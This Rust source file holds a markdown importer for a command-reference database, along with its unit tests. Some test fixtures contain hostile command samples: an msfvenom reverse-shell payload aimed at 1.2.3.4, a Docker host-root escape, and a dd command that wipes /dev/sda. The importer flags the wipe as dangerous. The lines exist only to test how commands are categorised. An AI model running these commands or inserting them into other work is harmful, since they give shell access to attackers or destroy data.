        tags.extend(opts.extra_tags.iter().cloned());
        let mut seen_tag = HashSet::new();
        tags.retain(|t| !t.is_empty() && seen_tag.insert(t.clone()));
        tags.truncate(5);

        let base = display_title(&n.title, &anc);
        let keywords = context_words(&anc, &n.title, printed);
        let keys_tool = keys_context(&tags, &n.title, &anc);
        let parts = split_body(&n.body, MAX_PART);
        let np = parts.len();
        if np > 1 {
            report.split += 1;
        }
        for (k, part) in parts.into_iter().enumerate() {
            let title = if np > 1 { format!("{} ({}/{})", base, k + 1, np) } else { base.clone() };
            let a = analyze(&part, &vocab, keys_tool);
            let category = categorize(&low, &a);
            let is_cmd = category == Category::Command;
            let (content, truncated) = cap_chars(&part, HARD_CAP);
            if truncated {
                report.truncated += 1;
            }
            let tool = pick_tool(&n.raw, &tags, &a, &vocab);
            drafts.push(Draft {
                title: title.clone(),
                ancestors: anc.clone(),
                entry: NewEntry {
                    title,
                    content,
                    category,
                    tags: tags.clone(),
                    tool,
                    command: if is_cmd { a.command } else { String::new() },
                    keywords: keywords.clone(),
                    danger: is_cmd && a.danger,
                    source: Source::Import,
                    ..Default::default()
                },
                pair: None,
            });
        }

        if opts.per_command {
            // Each annotated command becomes an entry of its own: the title says what it
            // does, `command` is that one command. Skipped when the section already *is* it.
            let section_cmd = norm_cmd(&analyze(&n.body, &vocab, keys_tool).command);
            let fallback = pick_tool(&n.raw, &tags, &Analysis::default(), &vocab);
            let mut pair_anc: Vec<String> = vec![n.title.clone()];
            pair_anc.extend(anc.iter().cloned());
            for p in pairs::extract(&n.body, &vocab, keys_tool) {
                let cmd_key = norm_cmd(&p.command);
                if cmd_key.is_empty() || cmd_key == section_cmd {
                    continue;
                }
                let title = display_title(&p.desc, &pair_anc);
                let lang = if p.kind == PairKind::Keys { keys_tool.unwrap_or("") } else { "bash" };
                let tool = pair_tool(&p, keys_tool, &fallback, &vocab);
                drafts.push(Draft {
                    title: title.clone(),
                    ancestors: pair_anc.clone(),
                    pair: Some((p.kind, p.desc.to_lowercase(), cmd_key)),
                    entry: NewEntry {
                        title,
                        content: format!("```{}\n{}\n```", lang, p.command),
                        category: Category::Command,
                        tags: tags.clone(),
                        tool,
                        danger: danger_reason(&p.command).is_some(),
                        command: p.command.clone(),
                        keywords: context_words(&pair_anc[..1], &p.desc, printed), // just the section: tags and tool carry the rest
                        source: Source::Import,
                        ..Default::default()
                    },
                });
            }
        }
    }

    drop_repeats(&mut drafts, &mut report);
    drop_pair_repeats(&mut drafts, &mut report);
    make_unique(&mut drafts, &mut report);

    let mut sizes: Vec<usize> = Vec::with_capacity(drafts.len());
    let mut items: Vec<NewEntry> = Vec::with_capacity(drafts.len());
    for d in drafts {
        let mut e = d.entry;
        e.title = d.title;
        match d.pair.as_ref().map(|p| p.0) {
            Some(PairKind::Shell) => report.pairs_shell += 1,
            Some(PairKind::Inline) => report.pairs_inline += 1,
            Some(PairKind::Keys) => report.pairs_keys += 1,
            None => {}
        }
        match e.category {
            Category::Command => report.commands += 1,
            Category::Note => report.notes += 1,
            Category::Tool => report.tools += 1,
        }
        if !e.tool.is_empty() {
            report.with_tool += 1;
        }
        let len = e.content.chars().count();
        sizes.push(len);
        if report.largest.as_ref().map_or(true, |(n, _)| len > *n) {
            report.largest = Some((len, e.title.clone()));
        }
        items.push(e);
    }
    sizes.sort_unstable();
    report.median_chars = sizes.get(sizes.len() / 2).copied().unwrap_or(0);

    Plan { items, skipped, report }
}

// ─── main entry point ─────────────────────────────────────────────────────────

pub fn import_markdown(db: &mut Database, path: &Path, opts: &ImportOptions) -> Result<ImportStats> {
    let text = std::fs::read_to_string(path)
        .with_context(|| format!("reading {}", path.display()))?;
    let Plan { items, skipped, report } = plan(&text, opts);

    // De-duplicate: never import data that already exists in the database, and
    // never import the same (title, content) twice within a single run. This
    // makes re-importing the same file a no-op.
    let mut existing = db.existing_title_content()?;
    let mut unique: Vec<NewEntry> = Vec::with_capacity(items.len());
    let mut duplicates = 0usize;
    for e in items {
        let key = (e.title.clone(), e.content.clone());
        if existing.contains(&key) {
            duplicates += 1;
        } else {
            existing.insert(key);
            unique.push(e);
        }
    }

    let candidates = unique.len();
    if !opts.dry_run {
        db.add_entries(&unique)?;
    }
    Ok(ImportStats { candidates, skipped, duplicates, report })
}

#[cfg(test)]
mod tests {
    use super::*;

    fn opts() -> ImportOptions {
        ImportOptions { dry_run: false, flagged_only: false, extra_tags: vec![], per_command: false }
    }
    fn entries(md: &str) -> Vec<NewEntry> {
        plan(md, &opts()).items
    }
    fn titles(md: &str) -> Vec<String> {
        entries(md).into_iter().map(|e| e.title).collect()
    }
    fn find<'a>(es: &'a [NewEntry], title: &str) -> &'a NewEntry {
        es.iter().find(|e| e.title == title).unwrap_or_else(|| panic!("no entry {:?} in {:?}", title, es.iter().map(|e| &e.title).collect::<Vec<_>>()))
    }

    // ── structure ──

    #[test]
    fn every_heading_level_makes_an_entry_and_containers_are_dropped() {
        let md = "# Doc title\n\n## Section\n\n### Leaf one\n\nFirst body text here, long enough.\n\n### Leaf two\n\nSecond body text here, long enough.\n";
        assert_eq!(titles(md), vec!["Leaf one", "Leaf two"]);
    }

    #[test]
    fn h1_sections_split_instead_of_being_glued_into_one_entry() {
        // The bug this replaced: single-# headings were ignored, so all three sections became one.
        let md = "## Setup\n\nSetup text that is long enough.\n\n# Privilege Escalation\n\nEscalation text that is long enough.\n\n# Instagram Recovery\n\nRecovery text that is long enough.\n";
        assert_eq!(titles(md), vec!["Setup", "Privilege Escalation", "Instagram Recovery"]);
    }

    #[test]
    fn hash_comments_inside_code_stay_in_the_entry() {
        let md = "## Backup\n\n```bash\n# make a tarball\ntar czf a.tgz dir\n\n# and copy it\ncp a.tgz /mnt\n```\n";
        let es = entries(md);
        assert_eq!(es.len(), 1);
        assert!(es[0].content.contains("# and copy it"));
    }

    #[test]
    fn a_pdf_style_dump_becomes_focused_entries_without_page_junk() {
        let page = |n: u32| format!("3/15/26, 11:40 PM\nUnbreakable Encryption Methods\n\n<https://chatgpt.com/c/x>\n{}/103\n", n);
        let md = format!(
            "{p0}\n## Encryption\n\n1️⃣ Strong algorithm\n\nAES-256 is used by governments and militaries.\n\n2️⃣ Strong key derivation\n\nIf you use a password, the system must slow down attackers.\n\n{p1}\nGood systems use:\n\n## PBKDF2\n\nArgon2\n\nscrypt\n\nThese make brute-forcing passwords extremely expensive.\n\n{p2}\n3️⃣ Strong passphrase\n\nThis is actually the weakest link most of the time.\n\n{p3}\n",
            p0 = page(5), p1 = page(6), p2 = page(7), p3 = page(8)
        );
        let es = entries(&md);
        let names: Vec<&str> = es.iter().map(|e| e.title.as_str()).collect();
        assert_eq!(names, vec!["Strong algorithm", "Strong key derivation", "Strong passphrase"]);
        let kd = find(&es, "Strong key derivation");
        assert!(kd.content.contains("Good systems use:") && kd.content.contains("- PBKDF2") && kd.content.contains("scrypt"));
        assert!(es.iter().all(|e| !e.content.contains("chatgpt.com") && !e.content.contains("11:40")));
        assert!(es.iter().all(|e| e.category == Category::Note), "prose about passphrases is not a command");
        assert!(kd.tags.iter().any(|t| t.starts_with("unbreakable")), "the printed title is kept as context: {:?}", kd.tags);
        assert!(kd.keywords.contains("unbreakable"));
    }

    #[test]
    fn banners_set_the_topic_tag_for_what_follows() {
        let md = "# =========\n# GIT & GITHUB\n# =========\n\n## Undo a commit\n\n```bash\ngit reset --soft HEAD~1\n```\n";
        let e = &entries(md)[0];
        assert_eq!(e.tags.first().map(String::as_str), Some("git"));
    }

    // ── titles ──

    #[test]
    fn generic_and_duplicate_titles_are_made_meaningful_by_their_parent() {
        let md = "## Docker\n\n### Best Practices\n\nRun as a non-root user always.\n\n## Git\n\n### Best Practices\n\nCommit small and often, with messages.\n\n## Vim\n\n### Examples\n\nUse dd to delete a line quickly.\n";
        let t = titles(md);
        assert!(t.contains(&"Docker — Best Practices".to_string()), "{:?}", t);
        assert!(t.contains(&"Git — Best Practices".to_string()), "{:?}", t);
        assert!(t.contains(&"Vim — Examples".to_string()), "{:?}", t);
        assert!(t.iter().all(|x| !x.ends_with(')')), "no bare counters when parents differ: {:?}", t);
    }

    #[test]
    fn identical_titles_under_identical_parents_get_a_counter_as_a_last_resort() {
        let md = "## Notes\n\n### Tip\n\nThe first tip body is here.\n\n### Tip\n\nThe second tip body is here.\n";
        assert_eq!(titles(md), vec!["Notes — Tip", "Notes — Tip (2)"]);
    }

    #[test]
    fn title_cleaning() {
        assert_eq!(clean_title("🔴 **Tier 0** — `sudo tee` fails"), "Tier 0 — sudo tee fails");
        assert_eq!(clean_title("3.1 The First Line (Shebang)"), "The First Line (Shebang)");
        assert_eq!(clean_title("13.2.4. Deep"), "Deep");
        assert_eq!(clean_title("1️⃣ Strong algorithm"), "Strong algorithm");
        assert_eq!(clean_title("2) Options"), "Options");
        assert_eq!(clean_title("[Link text](#anchor)"), "Link text");
        assert_eq!(clean_title("Lock down your accounts (highest"), "Lock down your accounts");
        assert_eq!(clean_title("Keep (this) intact"), "Keep (this) intact");
        assert_eq!(clean_title("2FA setup"), "2FA setup");
        assert_eq!(clean_title("5 things"), "5 things");
    }

    #[test]
    fn angle_brackets_in_a_title_are_text_unless_they_are_a_real_html_tag() {
        assert_eq!(clean_title("`<` (Less Than) - Input Redirection"), "< (Less Than) - Input Redirection");
        assert_eq!(clean_title("`<<<` (Here String)"), "<<< (Here String)");
        assert_eq!(clean_title("`>>` Append"), ">> Append");
        assert_eq!(clean_title("Setup <a id=\"setup\"></a>"), "Setup");
        assert_eq!(clean_title("Use <b>bold</b> text"), "Use bold text");
        assert_eq!(clean_title("`<div>` element"), "<div> element", "tags inside backticks are code");
    }

    #[test]
    fn a_table_whose_rows_link_to_sections_is_content_not_a_toc() {
        let md = "## Quick Command Index\n\n| Task | Command | Section |\n|---|---|---|\n| Update | `sudo apt update` | [Packages](#packages) |\n| Scan | `nmap -sS host` | [Recon](#recon) |\n| Fuzz | `ffuf -u http://t/FUZZ` | [Web](#web) |\n";
        assert_eq!(titles(md), vec!["Quick Command Index"]);
        assert!(is_toc_line("3. [Three](#three)") && is_toc_line("- [Git Basics](#git-basics)") && is_toc_line("  * [Sub](#sub)"));
        assert!(!is_toc_line("| a | [b](#c) |") && !is_toc_line("See [this](#that) for more"));
    }

    #[test]
    fn navigation_titles_with_a_cheat_sheet_inside_are_kept() {
        let md = "## Print This\n\n```bash\ntmux new -s name\ntmux a -t name\n```\n\n## Tags\n\nvim, editor, commands, reference\n";
        assert_eq!(titles(md), vec!["Print This"], "the code-bearing one is kept, the bare tag list dropped");
    }

    #[test]
    fn a_quick_reference_card_and_an_overview_with_content_are_kept() {
        let md = "## Git\n\n### Quick Reference Card\n\n```bash\ngit status\ngit add file\ngit commit -m \"message\"\n```\n\n### Overview\n\nGit tracks changes to files over time.\n";
        let t = titles(md);
        assert!(t.contains(&"Quick Reference Card".to_string()) || t.iter().any(|x| x.contains("Quick Reference Card")), "{:?}", t);
        assert!(t.contains(&"Git — Overview".to_string()), "{:?}", t);
    }

    #[test]
    fn bare_numbers_are_stripped_only_when_siblings_count_up() {
        let counting = "## Guide\n\n### 1 Introduction\n\nIntro text that is long enough.\n\n### 2 Getting Help - Your Best Friend\n\nHelp text that is long enough.\n";
        assert_eq!(titles(counting), vec!["Introduction", "Getting Help - Your Best Friend"]);
        let lone = "## Guide\n\n### 5 things to know\n\nThings text that is long enough.\n";
        assert_eq!(titles(lone), vec!["5 things to know"]);
    }

    // ── category, command, tool ──

    #[test]
    fn a_stray_command_word_in_prose_is_not_a_command() {
        // The bug this replaced: two lines starting "cat " / "sudo " made a 700-line essay a [CMD].
        let mut body = String::new();
        for i in 0..40 {
            body.push_str(&format!("Sentence number {} about encryption and why it matters.\n\n", i));
        }
        body.push_str("cat photo.jpg secret.gpg > vacation.jpg\n\nsudo apt update\n");
        let md = format!("## Hiding data\n\n{}", body);
        let es = plan(&md, &opts()).items;
        let total: usize = es.len();
        assert!(total >= 1);
        assert!(es.iter().all(|e| e.category == Category::Note), "{:?}", es.iter().map(|e| (&e.title, &e.category)).collect::<Vec<_>>());
    }

    #[test]
    fn a_fenced_shell_block_is_a_command_with_its_tool_and_command() {
        let md = "## Host discovery\n\n```bash\n# ping sweep\nnmap -sn 10.0.0.0/24\nnmap -sn 10.0.1.0/24\n```\n";
        let e = &entries(md)[0];
        assert_eq!(e.category, Category::Command);
        assert_eq!(e.tool, "nmap");
        assert!(e.command.contains("nmap -sn 10.0.0.0/24"));
        assert!(!e.danger);
    }

    #[test]
    fn code_in_other_languages_is_a_note_not_a_command() {
        let md = "## A python helper\n\n```python\nimport os\nprint(os.getcwd())\n```\n";
        let e = &entries(md)[0];
        assert_eq!(e.category, Category::Note);
        assert_eq!(e.command, "");
        assert_eq!(e.tool, "");
    }

    #[test]
    fn a_bare_fence_used_as_a_text_box_is_not_a_command() {
        let md = "## When to use SSH\n\n```\nUse SSH when:\n- you need tunneling\n- you need a shell\n```\n";
        assert_eq!(entries(md)[0].category, Category::Note);
    }

    #[test]
    fn vim_and_tmux_blocks_are_commands_for_their_own_tool() {
        let md = "## Delete lines\n\n```vim\ndd\n:%d\n:g/^$/d\n```\n";
        let e = &entries(md)[0];
        assert_eq!((e.category.clone(), e.tool.as_str()), (Category::Command, "vim"));
    }

    #[test]
    fn dense_unfenced_command_lines_make_a_command() {
        let md = "## Encrypt a file\n\nUse gpg for it:\n\ngpg -c --cipher-algo AES256 secret.txt\ngpg -d secret.txt.gpg > secret.txt\n\nThat is all.\n";
        let e = &entries(md)[0];
        assert_eq!(e.category, Category::Command);
        assert_eq!(e.tool, "gpg");
        assert!(e.command.starts_with("gpg -c --cipher-algo AES256 secret.txt"), "{:?}", e.command);
    }

    #[test]
    fn the_tool_is_the_one_most_commands_run_not_the_first_line() {
        let md = "## Docker socket exposure\n\n```bash\nls -la /var/run/docker.sock\ndocker ps\ndocker run -v /:/host -it alpine chroot /host\ndocker exec -it x sh\n```\n";
        assert_eq!(entries(md)[0].tool, "docker");
    }

    #[test]
    fn a_heading_that_names_a_program_wins() {
        let md = "## msfvenom (Payload Generator)\n\n```bash\nmsfvenom -p linux/x64/shell_reverse_tcp LHOST=1.2.3.4 LPORT=4444 -f elf > s.elf\nchmod +x s.elf\nchmod 755 s.elf\n```\n";
        assert_eq!(entries(md)[0].tool, "msfvenom");
        // English words that are also programs don't count when capitalised on their own
        let md = "## Install\n\n```bash\nsudo apt update\nsudo apt install nmap\n```\n";
        assert_eq!(entries(md)[0].tool, "apt");
    }

    #[test]
    fn ssh_config_directives_in_a_fence_are_not_the_host_program() {
        let md = "## Client config\n\n```bash\nHost myserver\n    HostName 192.168.1.100\n    User admin\n    Port 2222\n```\n";
        let e = &entries(md)[0];
        assert_eq!(e.tool, "", "'Host' is a directive here, not the host(1) command");
    }

    #[test]
    fn keybinding_notation_is_never_a_tool() {
        let md = "## Help & Debug\n\n```bash\nC-h k   # describe key\nC-h f\nC-h v\n```\n";
        assert_eq!(entries(md)[0].tool, "");
    }

    #[test]
    fn a_grab_bag_of_unrelated_commands_has_no_single_tool() {
        let md = "## Misc\n\n```bash\nsystemctl status ssh\ndf -h\nfree -m\nuname -a\nip a\n```\n";
        assert_eq!(entries(md)[0].tool, "");
    }

    #[test]
    fn a_tools_section_without_commands_is_a_tool_entry() {
        let md = "## Wireless Scanning Tools\n\nKismet and Wash cover most of what you need here.\n";
        assert_eq!(entries(md)[0].category, Category::Tool);
        let md = "## Installation\n\nDownload the release and unpack it somewhere.\n";
        assert_eq!(entries(md)[0].category, Category::Note, "'install' alone does not make a tool");
    }

    #[test]
    fn danger_is_checked_across_every_block() {
        let md = "## Cleanup\n\n```bash\nls /tmp\n```\n\nThen:\n\n```bash\nsudo dd if=/dev/zero of=/dev/sda bs=1M\n```\n";
        assert!(entries(md)[0].danger);
    }

    // ── size, drops, options ──

    #[test]
    fn a_long_section_is_split_at_paragraphs_and_never_inside_code() {
        let para = "This paragraph is a line of ordinary prose that repeats.\n\n".repeat(3);
        let code = format!("```bash\n{}```\n\n", "echo line\n\n".repeat(30));
        let md = format!("## Long one\n\n{}{}{}{}{}", para.repeat(40), code, para.repeat(40), code, para.repeat(40));
        let es = entries(&md);
        assert!(es.len() >= 3, "{} parts", es.len());
        assert!(es[0].title.starts_with("Long one (1/"));
        for e in &es {
            assert_eq!(e.content.matches("```").count() % 2, 0, "balanced fences in every part");
            assert!(e.content.chars().count() <= MAX_PART + 200);
        }
    }

    #[test]
    fn toc_and_navigation_sections_are_dropped() {
        let md = "## Table of Contents\n\n1. [One](#one)\n2. [Two](#two)\n3. [Three](#three)\n\n## Contents list\n\n- [One](#one)\n- [Two](#two)\n- [Three](#three)\n\n## Real\n\nActual content that is long enough.\n";
        assert_eq!(titles(md), vec!["Real"]);
    }

    #[test]
    fn flagged_only_keeps_critical_and_important_sections_and_their_children() {
        let md = "## CRITICAL Notes\n\n### Child one\n\nChild one body that is long enough.\n\n## Other\n\n### Child two\n\nChild two body that is long enough.\n";
        let o = ImportOptions { flagged_only: true, ..opts() };
        let t: Vec<String> = plan(md, &o).items.into_iter().map(|e| e.title).collect();
        assert_eq!(t, vec!["Child one"]);
    }

    #[test]
    fn extra_tags_are_attached() {
        let o = ImportOptions { extra_tags: vec!["master".into()], ..opts() };
        let e = &plan("## A heading\n\nBody text that is long enough.\n", &o).items[0];
        assert!(e.tags.contains(&"master".to_string()));
    }

    #[test]
    fn output_is_deterministic() {
        let md = "## A\n\n### Tip\n\nBody text number one.\n\n### Tip\n\nBody text number two.\n\n## B\n\n### Tip\n\nBody text number three.\n";
        let a: Vec<String> = titles(md);
        for _ in 0..5 {
            assert_eq!(titles(md), a);
        }
    }

    // ── database ──

    fn tmp_db() -> (Database, std::path::PathBuf) {
        let nanos = std::time::SystemTime::now().duration_since(std::time::UNIX_EPOCH).unwrap().as_nanos();
        let mut p = std::env::temp_dir();
        p.push(format!("recall_importtest_{}_{}.db", std::process::id(), nanos));
        let _ = std::fs::remove_file(&p);
        (Database::new(&p).unwrap(), p)
    }

    fn cleanup(p: &Path) {
        for ext in ["", "-wal", "-shm"] {
            let mut s = p.as_os_str().to_owned();
            s.push(ext);
            let _ = std::fs::remove_file(std::path::PathBuf::from(s));
        }
    }

    #[test]
    fn importing_twice_stores_nothing_the_second_time_and_dry_run_writes_nothing() {
        let (mut db, dbp) = tmp_db();
        let mut f = std::env::temp_dir();
        f.push(format!("recall_importsrc_{}.md", std::process::id()));
        std::fs::write(&f, "## One\n\nFirst body that is long enough.\n\n## Two\n\n```bash\nls -la /var/log/syslog\n```\n").unwrap();

        let dry = import_markdown(&mut db, &f, &ImportOptions { dry_run: true, ..opts() }).unwrap();
        assert_eq!(dry.candidates, 2);
        assert_eq!(db.existing_title_content().unwrap().len(), 0, "dry run wrote nothing");

        let first = import_markdown(&mut db, &f, &opts()).unwrap();
        assert_eq!((first.candidates, first.duplicates), (2, 0));
        let again = import_markdown(&mut db, &f, &opts()).unwrap();
        assert_eq!((again.candidates, again.duplicates), (0, 2));

        let _ = std::fs::remove_file(&f);
        cleanup(&dbp);
    }

    #[test]
    fn a_section_pasted_twice_is_one_entry_but_the_same_title_under_another_parent_is_kept() {
        let md = "## Docker\n\n### Best Practices\n\nRun as a non-root user always.\n\n### Best Practices\n\nRun as a non-root user always.\n\n## Git\n\n### Best Practices\n\nRun as a non-root user always.\n";
        let p = plan(md, &opts());
        assert_eq!(p.report.repeats, 1);
        assert_eq!(p.items.iter().map(|e| e.title.as_str()).collect::<Vec<_>>(), vec!["Docker — Best Practices", "Git — Best Practices"]);
    }

    #[test]
    fn banner_rules_and_horizontal_rules_are_not_entry_content() {
        let md = "# =====\n# TMUX\n# =====\n\n## Splits\n\n---\n\nUse prefix % to split the window in two.\n\n---\n";
        let es = entries(md);
        assert_eq!(es.len(), 1, "{:?}", es.iter().map(|e| (&e.title, &e.content)).collect::<Vec<_>>());
        assert_eq!(es[0].content, "Use prefix % to split the window in two.");
    }

    #[test]
    fn every_stage_of_a_pipeline_counts_toward_the_tool() {
        let md = "## Swap words\n\n```bash\necho \"a b\" | sed 's/a/b/'\necho \"c d\" | sed -E 's/c|d/e/g'\n```\n";
        assert_eq!(entries(md)[0].tool, "sed");
    }

    // ── command recognition: plumbing, bullets, key tables ──

    #[test]
    fn cd_and_source_blocks_are_commands_but_ssh_config_stays_a_note() {
        let md = "## cd\n\n```bash\ncd /path/to/dir\ncd ..\ncd ~\n```\n";
        let e = &entries(md)[0];
        assert_eq!((e.category.clone(), e.tool.as_str()), (Category::Command, "cd"));
        let md = "## Reload\n\n```bash\nsource ~/.bashrc\n```\n";
        assert_eq!(entries(md)[0].category, Category::Command);
        let md = "## Client config\n\n```bash\nHost myserver\n    HostName 1.2.3.4\n    Port 2222\n```\n";
        assert_eq!(entries(md)[0].category, Category::Note);
    }

    #[test]
    fn a_bullet_list_of_inline_commands_is_a_command_entry_with_a_copy_ready_command() {
        let md = "## Search options\n\n- `:set hlsearch` - Highlight search results\n- `:set incsearch` - Incremental search\n- `:noh` - Clear highlighting\n";
        let e = &entries(md)[0];
        assert_eq!(e.category, Category::Command);
        assert_eq!(e.command, ":set hlsearch\n:set incsearch\n:noh");
    }

    #[test]
    fn a_key_table_in_a_vim_section_is_a_command_for_vim() {
        let md = "## Vim editing keys\n\n```\nx          delete char\ndd         delete line\n```\n";
        let e = &entries(md)[0];
        assert_eq!((e.category.clone(), e.tool.as_str()), (Category::Command, "vim"));
        let elsewhere = "## Two columns\n\n```\nx          delete char\ndd         delete line\n```\n";
        assert_ne!(entries(elsewhere)[0].tool, "vim");
    }

    // ── per-command entries ──

    fn per_cmd(md: &str) -> Plan {
        plan(md, &ImportOptions { per_command: true, ..opts() })
    }

    #[test]
    fn per_command_is_off_by_default_and_makes_one_entry_per_annotated_command_when_on() {
        let md = "## File operations\n\n```bash\nls -la  # List files with details\nfind . -name '*.log'  # Find log files\n```\n";
        assert_eq!(entries(md).len(), 1, "off by default: just the section");
        let p = per_cmd(md);
        let titles: Vec<&str> = p.items.iter().map(|e| e.title.as_str()).collect();
        assert_eq!(titles, vec!["File operations", "List files with details", "Find log files"]);
        let ls = find(&p.items, "List files with details");
        assert_eq!((ls.command.as_str(), ls.tool.as_str(), ls.category.clone()), ("ls -la", "ls", Category::Command));
        assert_eq!(ls.tags, p.items[0].tags, "inherits the section's tags");
        assert!(ls.keywords.contains("operations"), "the section name is searchable context: {:?}", ls.keywords);
        assert_eq!(ls.content, "```bash\nls -la\n```");
        assert_eq!((p.report.pairs_shell, p.report.pairs_inline, p.report.pairs_keys), (2, 0, 0));
        assert!(p.report.render().contains("per-command"));
    }

    #[test]
    fn a_section_that_already_is_one_command_gets_no_duplicate_entry() {
        let md = "## Find large files\n\n```bash\n# Find large files over 100 MB\nfind / -size +100M -type f\n```\n";
        assert_eq!(per_cmd(md).items.len(), 1);
    }

    #[test]
    fn repeated_descriptions_are_told_apart_by_their_section_and_identical_pairs_collapse() {
        let md = "## Git\n\n```bash\ngit --version  # Show the version installed\n```\n\n## Docker\n\n```bash\ndocker --version  # Show the version installed\n```\n\n## Podman\n\n```bash\ndocker --version  # Show the version installed\n```\n";
        let p = per_cmd(md);
        let t: Vec<&str> = p.items.iter().map(|e| e.title.as_str()).collect();
        assert!(t.contains(&"Git — Show the version installed"), "{:?}", t);
        assert!(t.contains(&"Docker — Show the version installed"), "{:?}", t);
        assert_eq!(p.report.pair_repeats, 1, "the identical docker pair under Podman collapses: {:?}", t);
    }

    #[test]
    fn keys_and_bullets_become_entries_with_the_sections_tool() {
        let md = "## Vim registers\n\n```vim\n\"_dd   \" Delete without yanking\nyy   \" Yank the current line\n```\n\n- `:reg` - Show all registers\n";
        let p = per_cmd(md);
        let del = find(&p.items, "Delete without yanking");
        assert_eq!((del.command.as_str(), del.tool.as_str()), ("\"_dd", "vim"));
        let reg = find(&p.items, "Show all registers");
        assert_eq!((reg.command.as_str(), reg.tool.as_str()), (":reg", "vim"), "a lone key is not the program of the same name");
        assert_eq!((p.report.pairs_keys, p.report.pairs_inline), (2, 1));
    }

    #[test]
    fn a_single_letter_key_in_a_vim_table_is_not_read_as_a_program() {
        let md = "## Vim editing\n\n```\ndd         delete line\np          paste after cursor\n```\n";
        let p = per_cmd(md);
        assert_eq!(find(&p.items, "Delete line").tool, "vim", "dd here is a keystroke, not dd(1)");
    }

    #[test]
    fn a_destructive_pair_is_flagged_on_its_own_entry_only() {
        let md = "## Disks\n\n```bash\nsudo dd if=/dev/zero of=/dev/sda bs=1M  # Wipe the whole disk\nls /dev  # List the devices\n```\n";
        let p = per_cmd(md);
        assert!(find(&p.items, "Wipe the whole disk").danger);
        assert!(!find(&p.items, "List the devices").danger);
    }

    #[test]
    fn per_command_import_is_idempotent_and_deterministic() {
        let md = "## A\n\n```bash\nls -la  # List files here\n```\n\n## B\n\n```bash\nls -la  # List files here\npwd  # Print the working directory\n```\n";
        let a: Vec<String> = per_cmd(md).items.into_iter().map(|e| e.title).collect();
        for _ in 0..5 {
            assert_eq!(per_cmd(md).items.into_iter().map(|e| e.title).collect::<Vec<_>>(), a);
        }
    }

    #[test]
    fn the_report_summarises_what_the_parser_did() {
        let md = "## One\n\nFirst body that is long enough.\n\n## Two\n\n```bash\nls -la /var/log/syslog\n```\n";
        let r = plan(md, &opts()).report;
        assert_eq!((r.headings, r.commands, r.notes), (2, 1, 1));
        let s = r.render();
        assert!(s.contains("headings") && s.contains("entries") && s.contains("size"), "{}", s);
    }
}
